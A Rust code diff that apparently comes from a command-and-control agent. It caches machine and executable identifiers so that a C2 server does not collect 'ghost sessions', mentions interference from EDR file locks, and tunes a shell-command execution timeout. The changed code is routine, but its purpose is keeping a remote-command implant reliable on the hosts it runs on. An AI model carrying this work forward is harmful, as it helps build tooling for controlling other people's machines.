@@ -50,7 +50,20 @@ use std::fs;
 
 /// Generates a persistent unique ID for the machine.
 pub fn get_persistent_id() -> String {
-    machine_uid::get().unwrap_or_else(|_| Uuid::new_v4().to_string())
+    use std::sync::OnceLock;
+    static CACHED: OnceLock<String> = OnceLock::new();
+    CACHED.get_or_init(|| {
+        machine_uid::get().unwrap_or_else(|_| {
+            // Deterministic fallback: SHA256 of hostname so Docker/CI environments
+            // produce the same ID on repeated calls even without a machine-uid source.
+            let hostname = sys_info::hostname().unwrap_or_else(|_| "unknown-host".to_string());
+            let mut h = Sha256::new();
+            h.update(b"persistent-id-fallback:");
+            h.update(hostname.as_bytes());
+            let r = h.finalize();
+            Uuid::from_slice(&r[0..16]).unwrap_or_else(|_| Uuid::new_v4()).to_string()
+        })
+    }).clone()
 }
 
 /// Generates a unique ID for the specific executable binary.
@@ -60,10 +73,15 @@ pub fn generate_exe_id(salt: &str) -> String {
     // Without caching, if current_exe() or File::open fails intermittently
     // (EDR file locks, restrictive permissions), each call returns a fresh
     // UUID, creating thousands of orphaned "ghost" sessions on the C2.
-    use std::sync::OnceLock;
-    static CACHED_ID: OnceLock<String> = OnceLock::new();
-
-    CACHED_ID.get_or_init(|| {
+    use std::sync::{OnceLock, Mutex};
+    use std::collections::HashMap;
+    static CACHED_IDS: OnceLock<Mutex<HashMap<String, String>>> = OnceLock::new();
+    let cache = CACHED_IDS.get_or_init(|| Mutex::new(HashMap::new()));
+    {
+        let map = cache.lock().unwrap();
+        if let Some(id) = map.get(salt) { return id.clone(); }
+    }
+    let computed = (|| {
         let exe_path = match std::env::current_exe() {
             Ok(p) => p,
             Err(_) => {
@@ -101,7 +119,9 @@ pub fn generate_exe_id(salt: &str) -> String {
         }
         let result = hasher.finalize();
         Uuid::from_slice(&result[0..16]).unwrap_or_else(|_| Uuid::new_v4()).to_string()
-    }).clone()
+    })();
+    cache.lock().unwrap().insert(salt.to_string(), computed.clone());
+    computed
 }
 
 /// Executes a shell command based on the OS.
@@ -148,7 +168,7 @@ pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) ->
 
     // Grace period for reader threads after child exits. If a grandchild
     // holds the pipe open, we don't wait forever — take what we have.
-    const READER_GRACE: std::time::Duration = std::time::Duration::from_secs(3);
+    const READER_GRACE: std::time::Duration = std::time::Duration::from_secs(1);
 
     let start = std::time::Instant::now();
     loop {
